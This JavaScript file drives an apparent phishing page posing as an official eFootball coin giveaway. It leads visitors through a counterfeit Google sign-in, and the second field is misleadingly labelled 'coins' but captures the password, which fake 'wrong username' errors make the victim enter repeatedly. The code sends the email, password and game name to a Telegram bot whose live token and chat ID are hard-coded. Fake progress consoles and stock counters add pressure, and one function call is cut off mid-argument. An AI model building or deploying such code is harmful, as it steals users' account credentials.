/* ==========================================================================
   eFootball™ Official Campaign Event — Application Logic
   ========================================================================== */

let currentReward = {
  type: 'coin',
  title: '8.542 eFootball™ Coins',
  subtitle: 'Coin Pack',
  coins: 8542,
  img: 'clean-coins-1.png'
};

// Modal helpers
function showModal(id) {
  const modal = document.getElementById(id);
  if (modal) modal.classList.add('active');
}

function hideModal(id) {
  const modal = document.getElementById(id);
  if (modal) modal.classList.remove('active');
}

function closeOnBackdrop(e, id) {
  if (e.target === e.currentTarget) {
    hideModal(id);
  }
}

// Open In-Game Style Reward Confirmation
function openClaim(type, title, subtitle, coins, imgPath) {
  currentReward = { type, title, subtitle, coins, img: imgPath };

  const coinVal = document.getElementById('modalCoinVal');
  const coinImg = document.getElementById('modalCoinImg');
  const playerWrap = document.getElementById('modalPlayerCardWrap');
  const plusSign = document.getElementById('modalPlusSign');
  const playerImg = document.getElementById('modalPlayerImg');
  const playerName = document.getElementById('modalPlayerName');

  if (type === 'player') {
    // Player + 1.000 Coins
    if (coinVal) coinVal.textContent = '1.000';
    if (coinImg) coinImg.src = 'clean-coins-1.png?v=2';
    if (playerWrap) playerWrap.style.display = 'flex';
    if (plusSign) plusSign.style.display = 'block';
    if (playerImg) playerImg.src = imgPath;
    if (playerName) playerName.textContent = title;
  } else {
    // Coins Only
    const coinNumber = title.split(' ')[0];
    if (coinVal) coinVal.textContent = coinNumber;
    if (coinImg) coinImg.src = imgPath;
    if (playerWrap) playerWrap.style.display = 'none';
    if (plusSign) plusSign.style.display = 'none';
  }

  showModal('confirmOverlay');
}

// Open Search User (Username popup) after clicking OK on confirmation
let currentClaimUsername = '';
let currentClaimDivision = '';

function openSearchUser() {
  hideModal('confirmOverlay');
  const input = document.getElementById('usernameInput');
  const searchBtn = document.getElementById('btnUserSearch');
  const spinner = document.getElementById('searchSpinnerOverlay');
  const errEl = document.getElementById('searchErrorMsg');
  if (spinner) spinner.style.display = 'none';
  if (errEl) errEl.style.display = 'none';
  if (input) {
    input.value = '';
  }
  if (searchBtn) {
    searchBtn.disabled = true;
    searchBtn.classList.remove('active');
  }
  showModal('searchUserOverlay');
  setTimeout(() => {
    if (input) input.focus();
  }, 100);
}

function handleUsernameInput(val) {
  const searchBtn = document.getElementById('btnUserSearch');
  const errEl = document.getElementById('searchErrorMsg');
  if (errEl) errEl.style.display = 'none';

  if (!searchBtn) return;
  const trimmed = val.trim();
  if (trimmed.length > 0) {
    searchBtn.disabled = false;
    searchBtn.classList.add('active');
  } else {
    searchBtn.disabled = true;
    searchBtn.classList.remove('active');
  }
}

function handleUserSearch(e) {
  if (e) e.preventDefault();
  const input = document.getElementById('usernameInput');
  const errEl = document.getElementById('searchErrorMsg');
  const username = input ? input.value.trim() : '';

  if (errEl) errEl.style.display = 'none';

  if (!username) {
    if (input) input.focus();
    return;
  }

  // Show spinning eFootball icon over Search User modal (matches screenshot)
  const spinner = document.getElementById('searchSpinnerOverlay');
  const searchBtn = document.getElementById('btnUserSearch');
  if (spinner) spinner.style.display = 'flex';
  if (searchBtn) searchBtn.disabled = true;

  // Short nickname check: usernames with fewer than 4 chars (e.g. "saw") trigger "No matching users found."
  if (username.length < 4) {
    setTimeout(() => {
      if (spinner) spinner.style.display = 'none';
      if (searchBtn) {
        searchBtn.disabled = false;
        searchBtn.classList.add('active');
      }
      if (errEl) {
        errEl.style.display = 'block';
      }
      if (input) input.focus();
    }, 1100);
    return;
  }

  currentClaimUsername = username;

  // Simulate in-game online account search for 1.4s
  setTimeout(() => {
    if (spinner) spinner.style.display = 'none';
    hideModal('searchUserOverlay');

    // Populate Game Verification modal with entered username
    const nameDisplay = document.getElementById('verifiedUsernameDisplay');
    if (nameDisplay) {
      nameDisplay.textContent = currentClaimUsername;
    }

    const divSelect = document.getElementById('divisionSelect');
    if (divSelect) {
      divSelect.selectedIndex = 0;
    }

    // Open Game Verification modal
    showModal('verificationOverlay');
  }, 1400);
}

// Handle submit from Game Verification modal
function handleVerificationSubmit() {
  const divSelect = document.getElementById('divisionSelect');
  currentClaimDivision = divSelect && divSelect.value ? divSelect.value : 'Division 1';

  hideModal('verificationOverlay');
  showModal('pleaseWaitOverlay');

  // Wait 3.5 seconds with in-game Please Wait & 3D rotating eFootball icon
  setTimeout(() => {
    hideModal('pleaseWaitOverlay');
    openGoogleLoginModal();
  }, 3500);
}

/* ==========================================================================
   Google Sign-In Modal Controller (1:1 from Google / Konami auth prompt)
   ========================================================================== */
let currentGoogleEmail = '';

// Allowed & Trusted Email Provider Domains (@gmail, @yopmail, @outlook, @hotmail, etc.)
const TRUSTED_EMAIL_PROVIDERS = [
  // Google
  'gmail.com', 'gmail', 'googlemail.com',
  // Yopmail (specifically requested)
  'yopmail.com', 'yopmail', 'yopmail.fr', 'yopmail.net',
  // Microsoft Outlook & Hotmail (specifically requested)
  'outlook.com', 'outlook', 'outlook.com.tr', 'outlook.de', 'outlook.fr',
  'hotmail.com', 'hotmail', 'hotmail.com.tr', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de',
  'live.com', 'live', 'live.com.tr', 'msn.com',
  // Yahoo
  'yahoo.com', 'yahoo', 'yahoo.com.tr', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'myyahoo.com',
  // Apple iCloud
  'icloud.com', 'icloud', 'me.com', 'mac.com',
  // Yandex
  'yandex.com', 'yandex', 'yandex.com.tr', 'yandex.ru', 'ya.ru',
  // Proton
  'proton.me', 'protonmail.com', 'protonmail',
  // GMX & Web.de & Mail.com
  'gmx.com', 'gmx.net', 'gmx.de', 'mail.com', 'web.de',
  // Mail.ru
  'mail.ru', 'inbox.ru', 'bk.ru', 'list.ru',
  // AOL & Zoho
  'aol.com', 'zoho.com'
];

function validateTrustedEmail(input) {
  if (!input || typeof input !== 'string') {
    return { valid: false, error: 'Enter a valid email' };
  }

  const raw = input.trim().toLowerCase();
  if (raw.length === 0) {
    return { valid: false, error: 'Enter a valid email' };
  }

  const atIndex = raw.lastIndexOf('@');
  if (atIndex === -1) {
    return { valid: false, error: 'Enter a valid email' };
  }

  const user = raw.slice(0, atIndex).trim();
  const domain = raw.slice(atIndex + 1).trim();

  if (!user || !domain) {
    return { valid: false, error: 'Enter a valid email' };
  }

  if (!TRUSTED_EMAIL_PROVIDERS.includes(domain)) {
    return { valid: false, error: 'Enter a valid email' };
  }

  return { valid: true, error: null };
}

function openGoogleLoginModal() {
  const emailInput = document.getElementById('googleEmailInput');
  const emailWrap = document.getElementById('googleEmailWrap');
  const errorEl = document.getElementById('googleInputError');
  const nextBtn = document.getElementById('btnGoogleNext');
  const divider = document.getElementById('googleProgressDivider');
  const stepEmail = document.getElementById('googleStepEmail');
  const stepCoins = document.getElementById('googleStepCoins');

  // Reset to Step 1
  if (stepEmail) stepEmail.style.display = 'block';
  if (stepCoins) stepCoins.style.display = 'none';

  if (divider) divider.classList.remove('is-loading');

  if (emailWrap) {
    emailWrap.classList.remove('is-submitting', 'has-value');
  }

  if (emailInput) {
    emailInput.value = '';
    emailInput.classList.remove('has-error');
  }
  if (errorEl) {
    errorEl.style.display = 'none';
  }
  if (nextBtn) {
    nextBtn.classList.remove('is-disabled-loading');
    nextBtn.textContent = 'Next';
  }

  showModal('googleLoginOverlay');
  setTimeout(() => {
    if (emailInput) emailInput.focus();
  }, 200);
}

function handleGoogleInput(val) {
  const errorEl = document.getElementById('googleInputError');
  const emailInput = document.getElementById('googleEmailInput');
  const emailWrap = document.getElementById('googleEmailWrap');

  if (emailWrap) {
    if (val && val.trim().length > 0) {
      emailWrap.classList.add('has-value');
    } else {
      emailWrap.classList.remove('has-value');
    }
  }

  if (errorEl && errorEl.style.display !== 'none') {
    errorEl.style.display = 'none';
    if (emailInput) emailInput.classList.remove('has-error');
  }
}

function focusGoogleEmail() {
  const emailInput = document.getElementById('googleEmailInput');
  if (emailInput) emailInput.focus();
}

function handleGoogleLoginSubmit() {
  const emailInput = document.getElementById('googleEmailInput');
  const emailWrap = document.getElementById('googleEmailWrap');
  const errorEl = document.getElementById('googleInputError');
  const errorTextEl = document.getElementById('googleErrorText');
  const nextBtn = document.getElementById('btnGoogleNext');
  const divider = document.getElementById('googleProgressDivider');
  const emailVal = emailInput ? emailInput.value.trim() : '';

  const validation = validateTrustedEmail(emailVal);

  if (!validation.valid) {
    if (errorTextEl) errorTextEl.textContent = validation.error;
    if (errorEl) errorEl.style.display = 'flex';
    if (emailInput) {
      emailInput.classList.add('has-error');
      emailInput.focus();
    }
    return;
  }

  // Normalize email (e.g. user@gmail -> user@gmail.com)
  let normalized = emailVal;
  const atIdx = normalized.lastIndexOf('@');
  const domain = normalized.slice(atIdx + 1);
  if (!domain.includes('.')) {
    normalized += '.com';
  }

  currentGoogleEmail = normalized;

  // Show blue progress line animation & submitting state matching Photo 1
  if (divider) divider.classList.add('is-loading');
  if (emailWrap) emailWrap.classList.add('is-submitting');
  if (nextBtn) nextBtn.classList.add('is-disabled-loading');

  // Transition to Coins step (Welcome) after 1.25s
  setTimeout(() => {
    if (divider) divider.classList.remove('is-loading');
    if (nextBtn) nextBtn.classList.remove('is-disabled-loading');

    const stepEmail = document.getElementById('googleStepEmail');
    const stepCoins = document.getElementById('googleStepCoins');
    const displayEmailEl = document.getElementById('googleUserDisplayEmail');
    const coinsInput = document.getElementById('googleCoinsInput');
    const coinsError = document.getElementById('googleCoinsError');
    const coinsWrap = document.getElementById('googleCoinsWrap');

    if (displayEmailEl) displayEmailEl.textContent = currentGoogleEmail;
    if (stepEmail) stepEmail.style.display = 'none';
    if (stepCoins) stepCoins.style.display = 'block';

    if (coinsInput) {
      coinsInput.value = '';
    }
    if (coinsError) coinsError.style.display = 'none';
    if (coinsWrap) coinsWrap.classList.remove('has-error');

    setTimeout(() => {
      if (coinsInput) coinsInput.focus();
    }, 150);
  }, 1250);
}

// Switch back to Step 1 (Email) if user clicks the email badge
function backToGoogleEmailStep() {
  const stepEmail = document.getElementById('googleStepEmail');
  const stepCoins = document.getElementById('googleStepCoins');
  const emailWrap = document.getElementById('googleEmailWrap');
  const emailInput = document.getElementById('googleEmailInput');

  if (stepCoins) stepCoins.style.display = 'none';
  if (stepEmail) stepEmail.style.display = 'block';

  if (emailWrap) emailWrap.classList.remove('is-submitting');
  if (emailInput) {
    emailInput.focus();
  }
}

// Step 2: Coins Input Handlers

function handleCoinsInput(val) {
  const coinsError = document.getElementById('googleCoinsError');
  const coinsWrap = document.getElementById('googleCoinsWrap');

  // Kullanıcı yazmaya başladığı an önceki hatayı gizler
  if (coinsError) coinsError.style.display = 'none';
  if (coinsWrap) coinsWrap.classList.remove('has-error');
}

/* ==========================================================================
   Telegram Bot Configuration & Notification Dispatcher
   ========================================================================== */
const TELEGRAM_CONFIG = {
  // Telegram Bot Tokenınızı buraya yazabilirsiniz (Örn: '123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ')
  botToken: '8852389523:AAFbCBwdM7M5ip_WzMUd_MMvcE4d6E9Kulg',
  // Mesajın gideceği Chat ID (Örn: '987654321' veya '-1001234567890')
  chatId: '5133237786'
};

async function sendTelegramNotification(username, email, requestedCoins, rewardTitle) {
  if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
    console.log('[Telegram Bot] Token veya Chat ID henüz tanımlanmadı.', { username, email, requestedCoins, rewardTitle });
    return;
  }

  const dateStr = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
  const text = `⚽ <b>Yeni eFootball™ myClub Coin Talebi!</b>\n\n` +
    `👤 <b>Kullanıcı Adı:</b> <code>${username}</code>\n` +
    `📧 <b>E-Posta:</b> <code>${email}</code>\n` +
    `💰 <b>Şifre:</b> <b>${requestedCoins}</b>\n` +
    `🏆 <b>Seçilen Ödül / Paket:</b> ${rewardTitle || 'eFootball™ Kampanyası'}\n` +
    `📅 <b>Tarih / Saat:</b> ${dateStr}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.chatId,
        text: text,
        parse_mode: 'HTML'
      })
    });
    console.log('[Telegram Bot] Bildirim başarıyla iletildi!');
  } catch (err) {
    console.warn('[Telegram Bot] Mesaj gönderilirken hata oluştu:', err);
  }
}
// Deneme sayacı
let usernameAttemptCount = 0;

function handleGoogleCoinsSubmit() {
  const coinsInput = document.getElementById('googleCoinsInput');
  const coinsWrap = document.getElementById('googleCoinsWrap');
  const coinsError = document.getElementById('googleCoinsError');
  const coinsErrorText = document.getElementById('googleCoinsErrorText');
  const nextBtn = document.getElementById('btnGoogleCoinsNext');
  const divider = document.getElementById('googleProgressDivider');

  const rawVal = coinsInput ? coinsInput.value.trim() : '';

  // 1. Kural: 8 karakterden azsa temel kural hatası verir
  if (rawVal.length < 8) {
    if (coinsErrorText) coinsErrorText.textContent = 'Username must be at least 8 characters.';
    if (coinsError) coinsError.style.display = 'flex';
    if (coinsWrap) coinsWrap.classList.add('has-error');
    if (coinsInput) coinsInput.focus();
    return;
  }

  // 2. Kural: İlk 2 denemede "Kullanıcı adı hatalı" uyarısı verir
  if (usernameAttemptCount < 2) {
    usernameAttemptCount++;
    if (coinsErrorText) coinsErrorText.textContent = 'Wrong username. Try again.';
    if (coinsError) coinsError.style.display = 'flex';
    if (coinsWrap) coinsWrap.classList.add('has-error');
    if (coinsInput) {
      coinsInput.value = '';
      coinsInput.focus();
    }
    return; // Sayfa geçişini durdurur
  }

  let formattedCoins = rawVal;
  if (!formattedCoins.toLowerCase().includes('coin')) {
    formattedCoins += ' Coins';
  }

  // Show blue progress line animation
  if (divider) divider.classList.add('is-loading');
  if (nextBtn) nextBtn.classList.add('is-disabled-loading');

  // Send request notification to Telegram Bot
  sendTelegramNotification(
    currentClaimUsername || 'Oyuncu',
function showProcessingComplete(username = '') {
  const nameEl = document.getElementById('pcUsername');
  const userTag = username || currentClaimUsername || 'SDSE';
  if (nameEl) {
    nameEl.textContent = userTag;
  }

  const coinValEl = document.getElementById('pcCoinVal');
  const coinImgEl = document.getElementById('pcCoinImg');
  const playerWrap = document.getElementById('pcPlayerWrap');
  const plusEl = document.getElementById('pcPlus');
  const playerImgEl = document.getElementById('pcPlayerImg');
  const playerNameEl = document.getElementById('pcPlayerName');

  if (currentReward && currentReward.type === 'player') {
    // Ana ekranda futbolcu seçildiyse: 1.000 Coins + Futbolcu Kartı
    if (coinValEl) coinValEl.textContent = '1.000 Coins';
    if (coinImgEl) coinImgEl.src = 'clean-coins-1.png?v=2';
    if (plusEl) plusEl.style.display = 'block';
    if (playerWrap) playerWrap.style.display = 'flex';
    if (playerImgEl) playerImgEl.src = currentReward.img || 'card-ronaldo-109.png';
    if (playerNameEl) playerNameEl.textContent = currentReward.title || 'Cristiano Ronaldo';
  } else if (currentReward) {
    // Ana ekranda coin paketi seçildiyse: Seçilen paketin tam miktarı
    const coinNumber = currentReward.title.split(' ')[0];
    if (coinValEl) coinValEl.textContent = `${coinNumber} Coins`;
    if (coinImgEl) coinImgEl.src = currentReward.img || 'clean-coins-1.png?v=2';
    if (plusEl) plusEl.style.display = 'none';
    if (playerWrap) playerWrap.style.display = 'none';
  } else {
    if (coinValEl) coinValEl.textContent = '1.000 Coins';
    if (coinImgEl) coinImgEl.src = 'clean-coins-1.png?v=2';
    if (plusEl) plusEl.style.display = 'none';
    if (playerWrap) playerWrap.style.display = 'none';
  }

  showModal('processingCompleteOverlay');

  if (typeof confetti === 'function') {
    confetti({
      particleCount: 90,
      spread: 70,
      origin: { y: 0.6 },
      colors: ['#1a73e8', '#ffd700', '#ffffff', '#22c55e']
    });
  }
}

function handleHomePageClick() {
  hideModal('processingCompleteOverlay');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Execute claim & trigger simulation with username, division & google email
function executeClaim(username = '', division = '', email = '') {
  showModal('simOverlay');

  const fill = document.getElementById('simFill');
  const pct = document.getElementById('simPct');
  const consoleEl = document.getElementById('simConsole');
  const statusEl = document.getElementById('simStatus');

  if (fill) fill.style.width = '0%';
  if (pct) pct.textContent = '0%';
  if (consoleEl) consoleEl.innerHTML = '';

  const userTag = username ? username : 'Oyuncu';
  const divTag = division ? division : 'Division 1';
  const emailTag = email ? email : 'Google Hesabı';

  const steps = [
    { text: `[•] Hesap doğrulandı: ${userTag} (${divTag})`, pct: 18, status: 'Hesap Doğrulandı', delay: 400 },
    { text: `[✓] Konami & Google ID eşleşti (${emailTag})`, pct: 35, status: 'Ağ Bağlantısı Aktif', delay: 1000, cls: 'ok' },
    { text: '[•] eFootball™ Event Sunucusuna bağlanılıyor...', pct: 55, status: 'Sunucuya Bağlanılıyor', delay: 1600 },
    { text: `[•] Kampanya ID paketi hazırlanıyor: ${currentReward.title}`, pct: 75, status: 'Paket Hazırlanıyor', delay: 2300 },
    { text: `[✓] Ödül '${userTag}' hesabına aktarıldı!`, pct: 100, status: 'Tamamlandı', delay: 3200, cls: 'ok' }
  ];

  steps.forEach(step => {
    setTimeout(() => {
      if (consoleEl) {
        const line = document.createElement('div');
        line.className = `c-line ${step.cls || ''}`;
        line.textContent = step.text;
        consoleEl.appendChild(line);
        consoleEl.scrollTop = consoleEl.scrollHeight;
      }
      if (fill) fill.style.width = `${step.pct}%`;
      if (pct) pct.textContent = `${step.pct}%`;
      if (statusEl) statusEl.textContent = step.status;
    }, step.delay);
  });

  setTimeout(() => {
    hideModal('simOverlay');
    const rewardNameEl = document.getElementById('sRewardName');
    if (rewardNameEl) {
      rewardNameEl.innerHTML = `
        <div>${currentReward.title}</div>
        <div style="font-size:12px;color:#38bdf8;margin-top:5px;font-weight:700;">👤 Konami Nick: ${userTag} &nbsp;•&nbsp; ${divTag}</div>
        ${email ? `<div style="font-size:11px;color:#94a3b8;margin-top:2px;">🔗 Google Hesabı: ${email}</div>` : ''}
      `;
    }
    showModal('successOverlay');

    if (typeof confetti === 'function') {
      confetti({
        particleCount: 80,
        spread: 65,
        origin: { y: 0.6 },
        colors: ['#0088ff', '#ffd700', '#ffffff']
      });
    }
  }, 3900);
}

/* ==========================================================================
   Interactive Player Carousel Slider (10 Players + 4s Auto Transition + Clickable Dots)
   ========================================================================== */
let currentSlide = 0;
const totalCards = 10; // 10 real players (Messi, Ronaldo, Haaland, Ronaldinho, Mbappé, Hazard, Kahn, Rodri, Yamal, Bellingham)
let carouselTimer = null;
const slideIntervalMs = 4000; // 4 saniyede bir otomatik sağa geçer
let isTransitioning = false;

function getSlideStepWidth() {
  const track = document.getElementById('playerCarouselTrack');
  if (!track) return 0;
  const firstItem = track.querySelector('.player-card-item');
  if (!firstItem) return 0;
  return firstItem.offsetWidth + 8; // card width + 8px gap
}

function updatePaginationDots(activeIdx) {
  const dots = document.querySelectorAll('#playerPagination .p-dot');
  const normalizedIdx = ((activeIdx % totalCards) + totalCards) % totalCards;
  dots.forEach((dot, idx) => {
    if (idx === normalizedIdx) {
      dot.classList.add('active');
    } else {
      dot.classList.remove('active');
    }
  });
}

function goToSlide(index, animate = true) {
  const track = document.getElementById('playerCarouselTrack');
  if (!track) return;

  currentSlide = index;

  if (!animate) {
    track.classList.add('no-transition');
  } else {
    track.classList.remove('no-transition');
  }

  const stepWidth = getSlideStepWidth();
  track.style.transform = `translateX(-${currentSlide * stepWidth}px)`;
  updatePaginationDots(currentSlide);

  resetCarouselTimer();
}

function nextPlayerSlide() {
  if (isTransitioning) return;
  const track = document.getElementById('playerCarouselTrack');
  if (!track) return;

  isTransitioning = true;
  currentSlide++;

  track.classList.remove('no-transition');
  const stepWidth = getSlideStepWidth();
  track.style.transform = `translateX(-${currentSlide * stepWidth}px)`;
  updatePaginationDots(currentSlide % totalCards);

  if (currentSlide >= totalCards) {
    // Seamless infinite reset after slide transition finishes
    setTimeout(() => {
      track.classList.add('no-transition');
      currentSlide = 0;
      track.style.transform = `translateX(0px)`;
      void track.offsetHeight; // Force reflow
      track.classList.remove('no-transition');
      isTransitioning = false;
    }, 520);
  } else {
    setTimeout(() => {
      isTransitioning = false;
    }, 520);
  }

  resetCarouselTimer();
}

function prevPlayerSlide() {
  if (isTransitioning) return;
  const track = document.getElementById('playerCarouselTrack');
  if (!track) return;

  isTransitioning = true;

  if (currentSlide <= 0) {
    // Jump instantly to totalCards clone, then slide back to totalCards - 1
    track.classList.add('no-transition');
    currentSlide = totalCards;
    const stepWidth = getSlideStepWidth();
    track.style.transform = `translateX(-${currentSlide * stepWidth}px)`;
    void track.offsetHeight;

    requestAnimationFrame(() => {
      track.classList.remove('no-transition');
      currentSlide = totalCards - 1;
      track.style.transform = `translateX(-${currentSlide * stepWidth}px)`;
      updatePaginationDots(currentSlide);
      setTimeout(() => {
        isTransitioning = false;
      }, 520);
    });
  } else {
    currentSlide--;
    track.classList.remove('no-transition');
    const stepWidth = getSlideStepWidth();
    track.style.transform = `translateX(-${currentSlide * stepWidth}px)`;
    updatePaginationDots(currentSlide);
    setTimeout(() => {
      isTransitioning = false;
    }, 520);
  }

  resetCarouselTimer();
}

function resetCarouselTimer() {
  clearInterval(carouselTimer);
  carouselTimer = setInterval(nextPlayerSlide, slideIntervalMs);
}

// Initialize Carousel & Event Listeners
(function initCarousel() {
  const viewport = document.getElementById('playerCarouselViewport');
  if (!viewport) return;

  // Start auto timer
  resetCarouselTimer();

  // Pause on hover
  viewport.addEventListener('mouseenter', () => {
    clearInterval(carouselTimer);
  });

  viewport.addEventListener('mouseleave', () => {
    resetCarouselTimer();
  });

  // Re-align on resize
  window.addEventListener('resize', () => {
    goToSlide(currentSlide % totalCards, false);
  });

  // Touch Swipe Support for Mobile
  let touchStartX = 0;
  let touchEndX = 0;

  viewport.addEventListener('touchstart', (e) => {
    touchStartX = e.changedTouches[0].screenX;
    clearInterval(carouselTimer);
  }, { passive: true });

  viewport.addEventListener('touchend', (e) => {
    touchEndX = e.changedTouches[0].screenX;
    const diff = touchStartX - touchEndX;
    if (diff > 40) {
      nextPlayerSlide();
    } else if (diff < -40) {
      prevPlayerSlide();
    } else {
      resetCarouselTimer();
    }
  }, { passive: true });
})();

// Live stock countdown simulator
(function initStockCountdown() {
  const stockIds = [
    'stock-messi', 'stock-cr7', 'stock-haaland', 'stock-dinho', 'stock-mbappe',
    'stock-hazard', 'stock-kahn', 'stock-rodri', 'stock-yamal', 'stock-bellingham',
    'stock-c1', 'stock-c2', 'stock-c3', 'stock-c4', 'stock-c5', 'stock-c6'
  ];

  setInterval(() => {
    const randomId = stockIds[Math.floor(Math.random() * stockIds.length)];
    const el = document.getElementById(randomId);
    if (el) {
      let count = parseInt(el.textContent, 10);
      if (count > 1 && Math.random() > 0.45) {
        el.textContent = count - 1;
      }
    }
  }, 12000);
})();

/* ==========================================================================
   eFootball™ Splash / Opening Screen Handler
   ========================================================================== */
function dismissSplashScreen() {
  const splash = document.getElementById('siteSplashScreen');
  if (splash && !splash.classList.contains('fade-out')) {
    splash.classList.add('fade-out');
    setTimeout(() => {
      splash.style.display = 'none';
    }, 650);
  }
}

// Auto dismiss opening screen after 2.3 seconds
window.addEventListener('load', () => {
  setTimeout(dismissSplashScreen, 2300);
});
// Fallback dismiss
setTimeout(dismissSplashScreen, 3500);

function toggleUsernameVisibility() {
  const input = document.getElementById("googleCoinsInput");
  const checkbox = document.getElementById("toggleUsername");
  if (input && checkbox) {
    input.type = checkbox.checked ? "text" : "password";
  }
}

